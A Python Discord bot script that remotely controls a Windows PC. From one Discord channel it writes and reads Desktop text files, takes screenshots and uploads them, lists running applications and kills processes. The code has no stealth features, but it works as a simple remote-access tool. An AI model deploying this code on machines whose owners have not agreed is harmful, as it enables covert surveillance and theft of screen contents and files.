import discord
import os
import subprocess
from PIL import ImageGrab
from discord.ext import commands

TOKEN = '' # BOT TOKEN
CHANNEL_ID = 1234567890 # CHANNEL ID

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='.', intents=intents)

@bot.event
async def on_ready():
    print('')

# - # - # - # - # TXT FILE CREATE # - # - # - # - #

@bot.command()
async def text_create(ctx, *, args: str):
    if ctx.channel.id == CHANNEL_ID:
        await ctx.reply(f"```🕑 - Creating file```")

        try:
            *text_content_parts, text_filename = args.rsplit(' ', 1)
            text_content = ' '.join(text_content_parts)

            if not text_filename.endswith('.txt'):
                text_filename += '.txt'

            desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop', text_filename)

            with open(desktop_path, 'w') as f:
                f.write(text_content)

            await ctx.reply(f"```✅ - Created success '{text_filename}'```")
        except Exception as e:
            await ctx.reply(f"An error occurred: {e}")

@bot.command()
async def text_check(ctx):
    if ctx.channel.id == CHANNEL_ID:
        await ctx.reply("```🕑 - Checking text files```")

        try:
            desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
            txt_files = [f for f in os.listdir(desktop_path) if f.endswith('.txt')]

            if txt_files:
                txt_files_list = "\n".join(txt_files)
                if len(txt_files_list) > 2000:
                    txt_files_list = txt_files_list[:2000]

                await ctx.reply(f"`Desktop`\n```\n{txt_files_list}\n```")
            else:
                await ctx.reply("```🔴 - Not found text files```")

        except Exception as e:
            await ctx.reply(f"An error occurred: {e}")

@bot.command()
async def text_get(ctx, filename: str):
    if ctx.channel.id == CHANNEL_ID:
        await ctx.reply(f"```🕑 - '{filename}' Fetching contents.```")

        try:
            desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop', filename)

            if os.path.isfile(desktop_path) and filename.endswith('.txt'):
                with open(desktop_path, 'r') as f:
                    content = f.read()

                if len(content) > 2000:
                    content = content[:2000]

                await ctx.reply(f"`{filename}`\n```\n{content}\n```")
            else:
                await ctx.reply(f"```🔴 - '{filename}' does not exist```")

        except Exception as e:
            await ctx.reply(f"An error occurred: {e}")

# - # - # - # - # - # - # - # - # - # - # - # - # - #



# - # - # - # - # SCREENSHOT CMDS # - # - # - # - #

@bot.command()
async def screenshot(ctx):
    if ctx.channel.id == CHANNEL_ID:
        await ctx.reply("```📸 - Taking a screenshot```")

        try:
            screenshot = ImageGrab.grab()
            desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop', 'screenshot.png')
            screenshot.save(desktop_path)

            with open(desktop_path, 'rb') as file:
                await ctx.reply(file=discord.File(file, 'screenshot.png'))

            os.remove(desktop_path)

        except Exception as e:
            await ctx.reply(f"An error occurred: {e}")

# - # - # - # - # - # - # - # - # - # - # - # - # - #


# - # - # - # - # APPLICATION CONTROL # - # - # - # - #

@bot.command()
async def close_app(ctx, app_id: str):
    if ctx.channel.id == CHANNEL_ID:
        await ctx.reply(f"```🕑 - Attempting to close application```")

        try:
            process = subprocess.Popen(['taskkill', '/F', '/PID', app_id], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate()

            if stderr:
                await ctx.reply(f"```An error occurred: {stderr}```")
            else:
                await ctx.reply(f"```✅ - Successfully closed application  [ID: {app_id}]```")

        except Exception as e:
            await ctx.reply(f"An error occurred: {e}")

@bot.command()
async def check_app(ctx):
    if ctx.channel.id == CHANNEL_ID:
        await ctx.reply("```🕑 - Checking for open applications```")

        try:
            process = subprocess.Popen(['powershell', '-Command', '(Get-Process | Where-Object {$_.MainWindowTitle -ne ""}) | Select-Object -Property ProcessName, Id'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate()

            if stderr:
                await ctx.reply("An error occurred: " + stderr)
                return
            
            open_apps = stdout.splitlines()


            open_apps_list = "\n".join(open_apps)


            if len(open_apps_list) > 2000:

                truncated_apps = []
                current_length = 0

                for app in open_apps:
                    app_length = len(app) + 1
                    if current_length + app_length > 2000:
                        break
                    truncated_apps.append(app)
                    current_length += app_length

                open_apps_list = "\n".join(truncated_apps)

            if open_apps_list:
                await ctx.reply(f"`Open Applications`\n```\n{open_apps_list}\n```")
            else:
                await ctx.reply("```🔴 - There are no open foreground applications.```")

        except Exception as e:
            await ctx.reply(f"An error occurred: {e}")

# - # - # - # - # - # - # - # - # - # - # - # - # - #

bot.run(TOKEN)